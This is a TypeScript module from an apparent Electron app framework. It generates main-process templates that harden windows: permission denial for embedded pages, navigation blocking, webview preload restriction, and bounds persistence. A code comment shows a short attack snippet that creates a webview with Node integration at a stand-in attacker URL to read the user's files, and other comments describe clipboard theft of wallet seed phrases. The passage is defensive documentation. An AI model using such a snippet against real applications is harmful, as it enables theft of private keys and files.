// Shared types, helpers, and CJS template fragments for Electron script generators

import { resolve } from "@std/path";
import { hash8, slugify } from "../server/single-instance-lock.ts";
import { appsDirEnv, profileOfHome } from "../server/app-dirs.ts";
import { homedir } from "../server/paths.ts";
import { generateHTML } from "../server/server-html-gen.ts";
import type { TrayConfig, UiTheme } from "../server/aio-types.ts";
import {
  MOUNT_DEADLINE_MS,
  MOUNT_LINE,
  mountLine,
  RENDERER_TAG,
} from "./electron-renderer-log.ts";
import { upstreamNoiseMatcherSource } from "../diagnostics/upstream-noise.ts";
import {
  HOST_KEY_EVENT,
  HOST_KEY_MAX_LEN,
  HOST_KEYS_ATTR,
  HOST_KEYS_MAX,
} from "../protocol/host-keys.ts";
export { HOST_KEY_EVENT, HOST_KEYS_ATTR, HOST_KEYS_MAX };

export type Log = { info: (msg: string) => void; error: (msg: string) => void };

/** The `<head>`-shaped half of `UiConfig` — everything the HTML shell must
 *  carry because no runtime frame can deliver it after the page exists. */
export type ShellConfig = {
  showStatus?: boolean;
  width?: number;
  height?: number;
  viewport?: string | false;
  head?: string;
  /** ui.lang — `<html lang>`; the packaged shell must carry what dev serves. */
  lang?: string;
  /** ui.chrome — the packaged shell must draw the same title bar dev does. */
  chrome?: "standard" | "themed" | "none";
  /** ui.theme + the identity its accent comes from — without these the
   *  packaged app renders unstyled where dev renders themed, which is the
   *  exact shell-divergence class this whole file exists to prevent. */
  theme?: UiTheme;
  themeName?: string;
  /** ui.layout — `false` drops the theme's LAYOUT defaults.
   *
   *  `aio-lifecycle.ts` has always SET this on the object it builds here; this
   *  type had no field for it and `udsProdHTML` never forwarded it, so it was
   *  dropped on the floor. Type-checking did not notice because the object is
   *  an un-annotated const spread into the call, which turns excess-property
   *  checking off. Measured: `{ theme: "full", layout: false }` gave the app
   *  its own layout under `deno task dev` and the framework's `.row`/`.stack`/
   *  `.grid`/`.muted` rules inside the packaged shell — 11458 bytes of HTML
   *  served, 13470 bytes packaged. Exactly the divergence this file exists to
   *  prevent. */
  layout?: boolean;
  /** ui.dir — `<html dir>`, the RTL half of `lang`. Same story: declared on
   *  the server's own options type and dropped by every generator. */
  dir?: import("../server/aio-types.ts").UiConfig["dir"];
  /** The app's Content-Security-Policy, emitted into the shell as a
   *  `<meta http-equiv>`. Required here because the packaged window returns
   *  its HTML from the main process, never through the HTTP handler that
   *  attaches the policy as a header — so without this a packaged app has NO
   *  policy while its config says otherwise. See `headContent`'s `csp`. */
  csp?: string;
  /** Nonce for the shell's own inline module script, so a policy carrying
   *  `script-src 'self' 'nonce-…'` does not block the boot script it ships
   *  with. One per launch: the packaged HTML is templated once. */
  nonce?: string;
};

/** Window metadata extracted from config or HTML meta tags */
export type AioMeta = {
  title?: string;
  width?: number;
  height?: number;
  /** Allow openWindow child windows (off by default — see AioRunOptions). */
  childWindows?: boolean;
  /** `electron: { requireSandbox }` — refuse to launch at all rather than fall
   *  back to `--no-sandbox` on a host where Chromium's sandbox is unusable.
   *  See ElectronConfig. */
  requireSandbox?: boolean;
  /** `electron: { unsandboxedChildWindows }` — may a renderer's
   *  `openWindow(url, { sandbox: false })` be HONOURED? Off by default: the
   *  Chromium sandbox of a window this app opens is the app's decision, never
   *  the page's. See ElectronConfig. */
  unsandboxedChildWindows?: boolean;
  /** `ui.chrome` — how much of the window the OS draws. See UiConfig. */
  chrome?: "standard" | "themed" | "none";
  /** `ui.tray` — a system tray icon, menu and close-to-tray. See UiConfig. */
  tray?: boolean | TrayConfig;
  /** Electron's `app.name` — i.e. WHICH Chromium profile (userData directory)
   *  this window uses. `electronProfileName`; absent ⇒ the title's slug, which
   *  is what a default-home app has always had. */
  profileName?: string;
};

/** The app's `electron: { … }` block, as the window meta that carries it.
 *
 *  ONE copy of this mapping, and a total one — `tests/electron-sandbox-policy.
 *  test.ts` checks it against `VALID_ELECTRON_KEYS`, so a key added to the
 *  config and forgotten here is red rather than a permanently `undefined`
 *  security switch. That is the config-bridge bug class this repo has now paid
 *  for six times (`strictOrigin`, `redactActions`, `appDir`, `renderBudget`,
 *  `serveDirs`, `_cellNames`), and a SECURITY key silently lost is the worst
 *  version of it: the app believes it is protected. */
export function electronMetaPolicy(
  cfg: import("../server/aio-types.ts").ElectronConfig | undefined,
): Pick<AioMeta, "requireSandbox" | "unsandboxedChildWindows"> {
  return {
    requireSandbox: !!cfg?.requireSandbox,
    unsandboxedChildWindows: !!cfg?.unsandboxedChildWindows,
  };
}

/** Slugifies a title for use as Electron app name (stable userData path).
 *  THE transform, from `single-instance-lock.ts`: the userData path and the
 *  app's lock id are the same identity and must reduce a title the same way. */
export function toSlug(s: string): string {
  return slugify(s);
}

/** Electron's `app.name` for an app running from `home` — i.e. the userData
 *  directory its Chromium profile lives in.
 *
 *  ONE key with the lock. aio lets a second instance of an app run beside the
 *  first when its home differs (`lockKey(appId, home)` →
 *  `<appId>@<hash8(home)>`), but the profile was keyed by the app TITLE alone,
 *  so the two instances shared one Chromium profile — one cache, one Local
 *  Storage, one IndexedDB. A field report measured what that does: the second
 *  instance answered `net::ERR_CACHE_READ_FAILURE` on a script and showed a
 *  blank window; pointed at a profile of its own, 0 failures in 1674 requests
 *  on the same machine.
 *
 *  The default home keeps the plain slug — nothing already written moves —
 *  and every other home carries the lock key's own tag, so "which instance is
 *  this" has one answer and not two. */
export function electronProfileName(
  appId: string,
  title: string,
  home?: string,
  profile?: string,
): string {
  const slug = toSlug(title);
  // The Chromium profile is a MACHINE-wide directory, so it is keyed against
  // the machine-wide default home (`~/.<appId>`), never the scoped one: under
  // `AIO_APPS_DIR` (`--instance`) the lock key is the plain id, and an
  // instance's window opened the user's own profile (ERR_CACHE_READ_FAILURE).
  if (!home) return slug;
  const want = resolve(home);
  const machineDefault = resolve(homedir(), `.${appId}`);
  if (want === machineDefault) return slug;
  // A profile by its name — the default base's (`~/.myapp-dev`), or an
  // `appDir` app's (`<appDir>-dev`, named by the caller) — unless the apps root
  // is scoped (`--instance`): that `dev` is not the machine's `dev`.
  const named = profileOfHome(appId, want, machineDefault) ??
    (profile !== undefined && appsDirEnv() === undefined &&
        want.endsWith(`-${profile}`)
      ? profile
      : undefined);
  if (named) return `${slug}@${named}`;
  return `${slug}@${hash8(want)}`;
}

// ── Reusable CJS template fragments (embedded in generated Electron main.cjs) ──

/** Main-process crash guard. Without a listener, ANY uncaught exception in the
 *  Electron main process pops the native "A JavaScript error occurred in the
 *  main process" dialog — intrusive, uncopyable, and meaningless to end users.
 *  Installing a handler suppresses that dialog; we log the error prominently to
 *  stderr instead (visible in the dev console and app log). During quit a late
 *  socket/window callback must never dialog or crash — it just exits clean.
 *  Expects `app` to be in scope. Set `__aioQuitting = true` on window close. */
export function tmplCrashGuard(): string {
  return `
let __aioQuitting = false;
app.on('before-quit', () => { __aioQuitting = true; });
app.on('will-quit', () => { __aioQuitting = true; });
process.on('uncaughtException', (err) => {
  const info = (err && err.stack) || String(err);
  if (__aioQuitting) { console.error('[aio:electron] exception during quit (ignored): ' + info); return; }
  console.error('[aio:electron] uncaught exception in main process: ' + info);
  try { app.quit(); } catch { process.exit(1); }
});
process.on('unhandledRejection', (reason) => {
  console.error('[aio:electron] unhandled promise rejection in main process: ' + ((reason && reason.stack) || String(reason)));
});`;
}

/** 🔒 Permissions: an embedded page gets none.
 *
 *  Electron's default permission handler GRANTS EVERY REQUEST, and aio never
 *  installed one. A page inside a \`<webview>\` (or a foreign-origin iframe)
 *  therefore held clipboard-read, camera, microphone, geolocation and
 *  notifications with no prompt. Proven from the field on a crypto wallet built
 *  on aio: a page in its in-app browser read, with \`navigator.clipboard
 *  .readText()\`, text the wallet window had just copied — a seed phrase or a
 *  private key is exactly what such an app copies.
 *
 *  The rule, on every session (the default one and every \`<webview>\`
 *  partition, via \`session-created\`):
 *   • the app's OWN page (a window, requesting from the origin it shows) keeps
 *     what 1.0.11 gave it — it runs the app's own code;
 *   • anything else — a guest, a foreign-origin frame — is denied, except
 *     \`fullscreen\` (a video player's button). Each denial is said once per
 *     origin and permission: a refusal nobody can see is the bug class this
 *     file keeps closing. A guest that needs more should be a window, where the
 *     request is explicit (the same line the \`<webview>\` preload rule draws).
 *  Expects \`app\` in scope. */
export function tmplPermissionGuard(): string {
  return `
const __aioPermSeen = new WeakSet();
const __aioPermSaid = new Set();
// A custom scheme (aio://app) and data: both have origin "null" — compare
// scheme + host there, so a data: frame is not the app's own page.
function __aioOrigin(u) {
  try {
    const x = new URL(u);
    return x.origin !== 'null' ? x.origin : x.protocol + '//' + x.host;
  } catch { return ''; }
}
function __aioPermOk(wc, permission, requesting) {
  if (permission === 'fullscreen') return true;
  if (!wc || typeof wc.getType !== 'function' || wc.getType() !== 'window') return false;
  const own = __aioOrigin(wc.getURL());
  return !requesting || __aioOrigin(requesting) === own;
}
function __aioPermDenied(permission, requesting) {
  const key = permission + ' ' + requesting;
  if (__aioPermSaid.has(key)) return;
  __aioPermSaid.add(key);
  console.warn('[aio:electron] permission "' + permission + '" DENIED to embedded page ' +
    (requesting || '(unknown origin)') + ' — a <webview> guest or foreign-origin frame gets no ' +
    'permissions (clipboard, camera, microphone, geolocation, notifications…). Only the app\\'s ' +
    'own page keeps them.');
}
function __aioGuardSession(ses) {
  if (!ses || __aioPermSeen.has(ses)) return;
  __aioPermSeen.add(ses);
  ses.setPermissionRequestHandler((wc, permission, cb, details) => {
    const requesting = (details && details.requestingUrl) || (wc && wc.getURL()) || '';
    const ok = __aioPermOk(wc, permission, requesting);
    if (!ok) __aioPermDenied(permission, requesting);
    cb(ok);
  });
  ses.setPermissionCheckHandler((wc, permission, requestingOrigin) =>
    __aioPermOk(wc, permission, requestingOrigin));
}
app.on('session-created', __aioGuardSession);
app.on('ready', () => __aioGuardSession(require('electron').session.defaultSession));`;
}

/** Die with the aio server that launched this window.
 *
 *  Electron is spawned as a plain child: when the server is SIGKILLed,
 *  OOM-killed or crashes, the window stays up — "reconnecting" forever to a
 *  socket that will never come back, and when the app is started again the
 *  OLD window reconnects to the NEW server while the new server opens its own.
 *  Two windows, one app, one of them running yesterday's renderer. So the
 *  launcher passes its pid and the main process watches it: gone ⇒ quit, with
 *  a line saying why. A `process.ppid` check would not do — the `.bin/electron`
 *  shim sits between the two and outlives its parent as well.
 *  Expects `app` and `__aioQuitting` (tmplCrashGuard) in scope. */
export function tmplParentWatch(): string {
  return `
const __aioParent = Number(process.env.AIO_PARENT_PID || 0);
if (__aioParent > 0) {
  const __aioParentTimer = setInterval(() => {
    let alive = true;
    try { process.kill(__aioParent, 0); } catch (e) { alive = !!(e && e.code === 'EPERM'); }
    if (alive) return;
    clearInterval(__aioParentTimer);
    console.warn('[aio:electron] the aio server (pid ' + __aioParent + ') is gone — closing the window');
    __aioQuitting = true;
    try { app.quit(); } catch { process.exit(0); }
  }, 2000);
  __aioParentTimer.unref && __aioParentTimer.unref();
}`;
}

/** Window bounds persistence: stateFile, loadBounds, saveBounds.
 *  @param async Use async fs/promises variant (UDS) vs sync writeFileSync (standard) */
export function tmplBounds(async = false): string {
  // Persist bounds WITH the size the app declared at launch. On the next
  // start, if ui.width/height (or an explicit --width/--height) changed, the
  // new declaration wins; if it is unchanged, the user's resize is kept.
  // Without that, a leftover window-state.json silently ate every declared
  // size after the first launch (field report: window sizing).
  //
  // A MAXIMIZED window saves its NORMAL rect plus `maximized: true`, and comes
  // back maximized over that rect. Saving `getBounds()` stored the maximized
  // size as if the user had dragged the window to it: the next launch opened a
  // plain window filling the screen, and un-maximize had nowhere to return to
  // (measured on a nested display with a window manager). The key is written
  // only when true, so a non-maximized state file is byte-for-byte as before.
  const payload = `__aioBoundsPayload(win)`;
  const save = async
    ? `  try { require('fs/promises').writeFile(stateFile, JSON.stringify(${payload})).catch(() => {}); } catch {}`
    : `  // AIO-272: window state persistence failures should be visible
  try { fs.writeFileSync(stateFile, JSON.stringify(${payload})); }
  catch (e) { console.error("[aio:electron] saveBounds failed:", e); }`;
  return `
const stateFile = path.join(app.getPath('userData'), 'window-state.json');
let __aioDw = 800, __aioDh = 600;
// Set by loadBounds from the saved state; tmplBoundsTracking re-maximizes.
let __aioRestoreMax = false;

function __aioBoundsPayload(win) {
  const max = win.isMaximized();
  const r = max ? win.getNormalBounds() : win.getBounds();
  const out = { x: r.x, y: r.y, width: r.width, height: r.height, declaredWidth: __aioDw, declaredHeight: __aioDh };
  if (max) out.maximized = true;
  return out;
}

// A saved rect can come from a DIFFERENT display than the one this run is on:
// the same app launched on a 4000x2560 desktop saves y=392 (below a top
// panel), then a nested Xephyr display that is only 1280x900 tall restores
// the window hanging off the bottom. Electron restores x/y verbatim and does
// not clamp, so aio must: anything not fully inside a display's work area is
// repositioned into the one it overlaps most. An oversized window is pinned
// to the work-area origin — centred would clip both edges, and the title bar
// (the part that must stay reachable) is at the top-left.
function __aioFitBounds(b) {
  if (typeof b.x !== 'number' || typeof b.y !== 'number') return b;
  try {
    const { screen } = require('electron');
    const ds = screen.getAllDisplays();
    if (!ds.length) return b;
    for (const d of ds) {
      const a = d.workArea;
      if (b.x >= a.x && b.y >= a.y &&
          b.x + b.width <= a.x + a.width &&
          b.y + b.height <= a.y + a.height) return b;
    }
    let best = ds[0], bestArea = -1;
    for (const d of ds) {
      const a = d.workArea;
      const ix = Math.max(0, Math.min(b.x + b.width, a.x + a.width) - Math.max(b.x, a.x));
      const iy = Math.max(0, Math.min(b.y + b.height, a.y + a.height) - Math.max(b.y, a.y));
      if (ix * iy > bestArea) { bestArea = ix * iy; best = d; }
    }
    const a = best.workArea;
    const x = b.width >= a.width
      ? a.x
      : Math.max(a.x, Math.min(b.x, a.x + a.width - b.width));
    const y = b.height >= a.height
      ? a.y
      : Math.max(a.y, Math.min(b.y, a.y + a.height - b.height));
    return { width: b.width, height: b.height, x: x, y: y };
  } catch { return b; }
}

function loadBounds(dw, dh) {
  __aioDw = dw; __aioDh = dh;
  __aioRestoreMax = false;
  try {
    const d = JSON.parse(fs.readFileSync(stateFile, 'utf8'));
    if (d.width > 0 && d.height > 0) {
      // The rect is the NORMAL one (see __aioBoundsPayload) — fitted like any
      // other; the maximize is re-applied after the window exists.
      __aioRestoreMax = d.maximized === true;
      const same = d.declaredWidth === dw && d.declaredHeight === dh;
      // Declared size changed — keep position, take the new size.
      const out = same ? { width: d.width, height: d.height } : { width: dw, height: dh };
      if (typeof d.x === 'number') out.x = d.x;
      if (typeof d.y === 'number') out.y = d.y;
      return __aioFitBounds(out);
    }
  } catch {}
  return { width: dw, height: dh };
}

function saveBounds(win) {
${save}
}`;
}

/** THE window-shape rule, for BOTH generated shells: how much of the frame the
 *  OS draws (`ui.chrome`) and whether remote content may render inside the app
 *  (`childWindows` → `<webview>`).
 *
 *  It lives here because it was decided TWICE and only once correctly. The UDS
 *  shell read `meta.chrome` and `meta.childWindows`; the WebSocket shell — the
 *  one taken whenever the app has a TCP port, i.e. `--expose`, `--port=N`, or
 *  `transport: "ws"` — read neither. So the same `ui.chrome: "none"` produced a
 *  frameless window under `deno task dev` and a fully framed one under
 *  `deno task dev --expose`: one config, two windows, no warning. `ui.chrome`
 *  is one of the three identity-derived defaults the framework promises are
 *  the same everywhere the app appears, which makes a transport-dependent
 *  answer exactly the divergence class this project refuses.
 *
 *  Emits the `b.webPreferences = …` / `b.frame = …` pair; `extra` carries the
 *  keys only one shell has (the UDS preload). Expects `b` in scope. */
export function tmplWindowShape(
  meta: AioMeta | undefined,
  extra: Record<string, string> = {},
): string {
  const prefs = [
    "nodeIntegration: false",
    "contextIsolation: true",
    // webviewTag rides the same childWindows opt-in as openWindow: both are
    // "render remote content inside the app". Off by default; a <webview>
    // without the gate simply does not render.
    `webviewTag: ${JSON.stringify(!!meta?.childWindows)}`,
    ...Object.entries(extra).map(([k, v]) => `${k}: ${v}`),
  ];
  return `  b.webPreferences = { ${prefs.join(", ")} };
  // ui.chrome: "themed"/"none" drop the OS frame. "themed" gets aio's own
  // title bar back from the page shell (server-html-gen); "none" is a bare
  // canvas and the app draws whatever it wants, including its drag region.
  b.frame = ${JSON.stringify((meta?.chrome ?? "standard") === "standard")};`;
}

/** Debounced bounds tracking (resize/move/close) — returns CJS lines to insert
 *  inside ready, right after the window is created. Re-applies a saved
 *  maximize first (loadBounds sets `__aioRestoreMax`). */
export function tmplBoundsTracking(): string {
  return `  if (__aioRestoreMax) {
    try { win.maximize(); }
    catch (e) { console.warn('[aio:electron] could not restore the maximized window:', e); }
  }
  let t;
  const save = () => { clearTimeout(t); t = setTimeout(() => saveBounds(win), 500); };
  win.on('resize', save);
  win.on('move', save);
  win.on('close', () => saveBounds(win));`;
}

/** Local keyboard shortcuts (Ctrl+F5/Ctrl+R reload, F12 devtools,
 *  Ctrl+Shift+Del clear cache). Plain F5 is deliberately NOT bound — it stays
 *  free for aio apps' own custom shortcuts. */
export function tmplKeyboardShortcuts(): string {
  return `  // Local keyboard shortcuts (only when window has focus)
  win.webContents.on('before-input-event', (event, input) => {
    if (input.type !== 'keyDown') return;
    const ctrl = input.control || input.meta;
    // Ctrl+F5 / Ctrl+R / Ctrl+Shift+R — hard reload (bypasses cache).
    // Plain F5 is left to the app (custom in-app shortcuts).
    if ((ctrl && input.key === 'F5') || (ctrl && input.key.toLowerCase() === 'r')) {
      event.preventDefault();
      win.webContents.reloadIgnoringCache();
    }
    // F12 / Ctrl+Shift+I — toggle DevTools
    if (input.key === 'F12' || (ctrl && input.shift && input.key.toLowerCase() === 'i')) {
      event.preventDefault();
      win.webContents.toggleDevTools();
    }
    // Ctrl+Shift+Delete — clear all caches and hard reload
    if (ctrl && input.shift && input.key === 'Delete') {
      event.preventDefault();
      win.webContents.session.clearCache().then(() => {
        win.webContents.session.clearStorageData().then(() => {
          win.webContents.reloadIgnoringCache();
        });
      });
    }
    // Ctrl+P — renderer window.print() is a no-op on Electron 41 Linux, call from main instead
    if (ctrl && !input.shift && input.key.toLowerCase() === 'p') {
      event.preventDefault();
      win.webContents.print({ silent: false, printBackground: true });
    }
  });`;
}

/** will-navigate interception — blocks cross-origin nav, relays via IPC.
 *  @param originExpr JS expression that evaluates to the app origin string */
export function tmplWillNavigate(
  originExpr: string,
  /** Name of an in-scope function to call with the URL when an IN-APP
   *  navigation is vetoed here. The UDS shell passes its relay's restore:
   *  `did-start-navigation` fires BEFORE `will-navigate` (measured, Electron
   *  44) and has already closed the relay by the time the veto runs — so the
   *  veto is the one moment the shell KNOWS the document is staying. Omitted
   *  by shells that gate nothing on a document change. */
  onInAppVeto?: string,
): string {
  return `  // AIO-54: Electron swallows <a> clicks before DOM dispatch — relay via IPC.
  // only SAME-APP links are in-app navigation. A cross-origin
  // (external) link must never be fed to navigate() — for a routerless app that
  // pushState()s a bogus path and white-screens on reload. Send external
  // http/https to the system browser instead; block everything else.
  //
  // "Same app" is protocol + host, NOT \`URL.origin\`: for a custom scheme the
  // WHATWG origin is the literal string "null", so on the zero-port page
  // (aio://app/) every navigation — including the dev reload of the root —
  // compared unequal, was vetoed here, and the window sat on its old document
  // with the relay frozen (net::ERR_ABORTED, nothing logged).
  const _sameApp = (u) => (u.protocol + '//' + u.host) === ${originExpr};
  win.webContents.on('will-navigate', (event, navUrl) => {
    let u;
    try { u = new URL(navUrl); } catch {
      event.preventDefault();
      console.warn('[aio:electron] navigation blocked (unparsable URL): ' + navUrl);
      return;
    }
    if (_sameApp(u)) {
      // A RELOAD of the document already showing must proceed: it is the dev
      // live-reload, and the only way a page ever gets a new document.
      // location.reload() reaches will-navigate carrying the CURRENT url
      // (measured on Electron 44), so "same url as the one on screen" is what
      // a reload looks like from here. Everything else same-app is a ROUTE
      // CHANGE and is handled in-app.
      //
      // This used to exempt the ROOT PATH instead — right for one case (a
      // reload while on /) and wrong for two. A reload on any other route was
      // vetoed, so dev reload silently did nothing off the home page, and
      // worse, it stalled the relay (did-start-navigation had already closed
      // it and no document came to reopen it). And every navigation TO / from
      // elsewhere reloaded the whole window: a white flash, a re-mounted tree
      // and a new connection on every app's most frequent navigation. A field
      // report renamed its home page to /chat to escape it (report 9 §5.3).
      let cur = null;
      try { cur = new URL(win.webContents.getURL()); } catch {}
      const noHash = (x) => x.protocol + '//' + x.host + x.pathname + x.search;
      const isReload = cur && cur.href
        ? noHash(cur) === noHash(u)
        : (u.pathname === '/' || u.pathname === ''); // no document yet: the old rule
      if (isReload) return; // a real load — the document is being replaced
      event.preventDefault();
${
    onInAppVeto
      ? `      ${onInAppVeto}(navUrl); // the document stays — reopen what did-start-navigation closed
`
      : ""
  }      win.webContents.send('__aio:navigate', navUrl); // in-app route
      return;
    }
    event.preventDefault(); // external — never route it into the app
    if (u.protocol === 'http:' || u.protocol === 'https:') {
      require('electron').shell.openExternal(navUrl);
    } else {
      console.warn('[aio:electron] navigation blocked (not this app, not http): ' + navUrl);
    }
  });
  win.webContents.setWindowOpenHandler(({ url }) => {
    // window.open / target=_blank to an external site → system browser, not a
    // rogue Electron window.
    try {
      const u = new URL(url);
      if (u.protocol === 'http:' || u.protocol === 'https:') {
        require('electron').shell.openExternal(url);
      }
    } catch {}
    return { action: 'deny' };
  });
  // 🔒 A GUEST MAY NOT ASK FOR NODE. Electron's own security checklist names
  // this hook, and it was missing: with webviewTag enabled (childWindows),
  // any script in the renderer could
  //
  //     const w = document.createElement('webview');
  //     w.setAttribute('nodeintegration', 'on');
  //     w.src = 'https://attacker/';
  //
  // and reach require('fs') in the guest process — i.e. read any file the
  // user can, past every gate the app has. Reported by a crypto wallet built on aio,
  // where that file is the key vault: the app's own <webview> usage is
  // careful, but an app can only choose the attributes of the element IT
  // creates, never of one an attacker creates.
  //
  // will-attach-webview is the only place this can be refused, because it
  // fires BEFORE the guest's process is spawned — did-attach-webview below
  // is already too late to change its preferences.
  //
  // A preload is allowed only from inside the app directory, resolved with
  // realpath so a symlink cannot point out of it. Everything else about the
  // guest is forced, not merely defaulted: an app that genuinely needs a
  // privileged guest should open a window, where the request is explicit.
  win.webContents.on('will-attach-webview', (_ev, webPreferences, params) => {
    webPreferences.nodeIntegration = false;
    webPreferences.nodeIntegrationInSubFrames = false;
    webPreferences.contextIsolation = true;
    webPreferences.webSecurity = true;
    delete webPreferences.preloadURL;
    const want = params.preload || webPreferences.preload;
    let ok = false;
    let root = '';
    let why = '';
    if (want) {
      try {
        // The same root the openWindow handler uses. typeof guarded because
        // this template is shared with the WebSocket window, whose generated
        // script does not declare BASE_DIR — and a throw here would be a
        // refusal anyway, which is the right direction to fail. Resolved
        // FIRST so the refusal can name it even when the preload itself is
        // what fails to resolve: the whole failure is a mismatch between two
        // roots the app author cannot see.
        root = fs.realpathSync(
          (typeof BASE_DIR === 'string' && BASE_DIR) || process.cwd(),
        );
        // No regex on purpose. A /^file:\\/\\// literal here emits
        // /^file:/// into the generated script, where the trailing // is a
        // LINE COMMENT that swallows the closing paren — a syntax error in a
        // file no type-checker reads, i.e. a window that never opens. Caught
        // by the parse test; kept as prose so it is not reintroduced.
        // fileURLToPath, not slice(7): a URL is percent-encoded (the space in
        // "/Applications/My App.app" is %20) and on Windows it is
        // file:///C:/…, so the sliced "path" never existed and EVERY such
        // preload was refused as ENOENT.
        const wantPath = want.startsWith('file://')
          ? require('url').fileURLToPath(want)
          : want;
        const real = fs.realpathSync(wantPath);
        ok = real === root || real.startsWith(root + path.sep);
        if (ok) webPreferences.preload = real;
        else why = 'it resolves to ' + real + ', which is outside that directory';
      } catch (e) {
        // The REASON, not a discarded exception. ENOENT here — the file is
        // simply not there, the likeliest cause in a packaged build — is the
        // line that explains the whole thing, and it used to be thrown away.
        why = String((e && e.message) || e);
      }
      if (!ok) {
        // Every refusal SAYS which guardrail fired. A refused preload does
        // NOT fail the attach: the guest loads, renders, and simply has no
        // bridge. Reported from the field as "the embedded page renders but
        // cannot see the app" — found by reading aio's source, because there
        // was no line anywhere, on either side, naming a rule.
        console.warn(
          '[aio:electron] <webview> preload REFUSED: ' + want +
            ' — a guest preload must resolve (realpath) inside the app directory ' +
            (root || '(which could not be resolved either)') +
            (why ? ' — ' + why : '') +
            '. The guest will load with NO preload and NO bridge: it will not ' +
            'crash, and nothing else will be logged about it.',
        );
      }
    }
    if (!ok) {
      delete webPreferences.preload;
      delete params.preload;
    }
    // The page cannot re-request Node through the attributes either.
    params.nodeintegration = 'off';
    params.nodeintegrationinsubframes = 'off';
    params.disablewebsecurity = 'off';
    params.allowpopups = 'off';
  });
  // Local hotfix: <webview> GUESTS need the same popup policy — the guest's
  // 'new-window' DOM event was removed in Electron 22, so a renderer-side
  // listener never fires and a target=_blank inside an embedded page did
  // nothing at all (no window, no external open). The guest's own
  // setWindowOpenHandler is the supported route.
  win.webContents.on('did-attach-webview', (_ev, guest) => {
    guest.setWindowOpenHandler(({ url }) => {
      try {
        const u = new URL(url);
        if (u.protocol === 'http:' || u.protocol === 'https:') {
          require('electron').shell.openExternal(url);
        }
      } catch {}
      return { action: 'deny' };
    });
${tmplHostKeyRelay()}
  });`;
}

/** Host-key relay — the body of `did-attach-webview` (expects `win` and
 *  `guest` in scope).
 *
 *  A key pressed while focus is inside an IFRAME within a guest never reaches
 *  the host: the guest's preload runs in its top frame only
 *  (`nodeintegrationinsubframes` is forced off, and turning it on would put a
 *  preload into every third-party frame). So "Escape always gives the
 *  keyboard back" failed exactly when the user had clicked into a video embed
 *  or a captcha. The guest's `before-input-event` sees EVERY frame, and only
 *  real input (a page cannot synthesize it), so the relay lives in main:
 *
 *   - the keys are the ones the EMBEDDING element declares
 *     ({@link HOST_KEYS_ATTR}), read once when the guest attaches — the guest
 *     cannot declare, widen or observe anything;
 *   - filtered HERE, so an undeclared key never leaves the main process;
 *   - keyDown only; the guest still receives the key (relay, not steal);
 *   - delivered as a bubbling {@link HOST_KEY_EVENT} CustomEvent on the
 *     `<webview>` element, with the modifiers. `executeJavaScript` rather than
 *     IPC: the WebSocket shell has no preload, and this must work in both. */
function tmplHostKeyRelay(): string {
  // Finds the element hosting THIS guest; `getWebContentsId()` is already
  // answered at did-attach-webview (measured, Electron 44).
  const find = (gid: string, body: string) =>
    `'(() => { for (const w of document.querySelectorAll("webview")) { ' +
        'let id; try { id = w.getWebContentsId(); } catch { continue; } ' +
        'if (id === ' + ${gid} + ') { ${body} } } return null; })()'`;
  return `    // Host-key relay (see tmplHostKeyRelay in electron-shared.ts).
    const _hkHost = win.webContents;
    const _hkGid = guest.id;
    _hkHost.executeJavaScript(${
    find("_hkGid", `return w.getAttribute(${JSON.stringify(HOST_KEYS_ATTR)});`)
  }).then((raw) => {
      if (raw === null || raw === undefined) return; // nothing declared
      let keys = null;
      try { keys = JSON.parse(raw); } catch {}
      const ok = Array.isArray(keys) && keys.length > 0 &&
        keys.length <= ${HOST_KEYS_MAX} &&
        keys.every((k) => typeof k === 'string' && k.length > 0 && k.length <= ${HOST_KEY_MAX_LEN});
      if (!ok) {
        console.warn('[aio:electron] <webview> ${HOST_KEYS_ATTR} IGNORED: ' +
          String(raw).slice(0, 200) + ' — expected a JSON array of 1..${HOST_KEYS_MAX} ' +
          'KeyboardEvent.key names (e.g. ["Escape"]). No key will be relayed from this guest.');
        return;
      }
      const set = new Set(keys);
      guest.on('before-input-event', (_e, input) => {
        if (input.type !== 'keyDown' || !set.has(input.key)) return;
        if (guest.isDestroyed() || _hkHost.isDestroyed()) return;
        const detail = JSON.stringify({
          key: input.key, code: input.code,
          ctrlKey: !!input.control, shiftKey: !!input.shift,
          altKey: !!input.alt, metaKey: !!input.meta, repeat: !!input.isAutoRepeat,
        });
        _hkHost.executeJavaScript(${
    find(
      "_hkGid",
      `w.dispatchEvent(new CustomEvent(${
        JSON.stringify(HOST_KEY_EVENT)
      }, { bubbles: true, detail: ' + detail + ' })); return true;`,
    )
  }).catch((e) => {
          console.warn('[aio:electron] host key ' + input.key + ' not delivered: ' + String((e && e.message) || e));
        });
      });
    }, (e) => {
      console.warn('[aio:electron] could not read the <webview> host keys: ' + String((e && e.message) || e));
    });`;
}

// ── Client connect page HTML (used by electronClientScript) ──

export const CONNECT_HTML = `<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>aio</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
      background: #1a1a2e; color: #e0e0e0;
      display: flex; align-items: flex-start; justify-content: center;
      min-height: 100vh; user-select: none; padding: 3rem 1rem;
    }
    .card { width: 100%; max-width: 420px; }
    h1 {
      font-size: 1.8rem; font-weight: 300; letter-spacing: 0.1em;
      color: #4a9eff; margin-bottom: 1.5rem; text-align: center;
    }
    form { display: flex; gap: 0.5rem; }
    input {
      flex: 1; padding: 0.6rem 1rem; font-size: 0.95rem;
      background: #16213e; border: 1px solid #333; border-radius: 6px;
      color: #e0e0e0; outline: none; min-width: 0;
    }
    input:focus { border-color: #4a9eff; }
    input::placeholder { color: #666; }
    button {
      padding: 0.6rem 1.2rem; font-size: 0.95rem;
      background: #4a9eff; border: none; border-radius: 6px;
      color: white; cursor: pointer; white-space: nowrap;
    }
    button:hover { background: #3a8eef; }
    #err { margin-top: 1rem; font-size: 0.85rem; color: #f44; min-height: 1.2em; text-align: center; }
    .section { margin-top: 1.75rem; }
    .section h2 {
      font-size: 0.72rem; text-transform: uppercase; letter-spacing: 0.12em;
      color: #6b7a99; margin-bottom: 0.6rem; display: flex; align-items: center; gap: 0.5rem;
    }
    .dot { width: 7px; height: 7px; border-radius: 50%; background: #3ecf8e; display: inline-block; }
    .dot.scanning { background: #4a9eff; animation: pulse 1s infinite; }
    @keyframes pulse { 0%,100% { opacity: 1 } 50% { opacity: 0.3 } }
    .app {
      display: flex; align-items: center; justify-content: space-between;
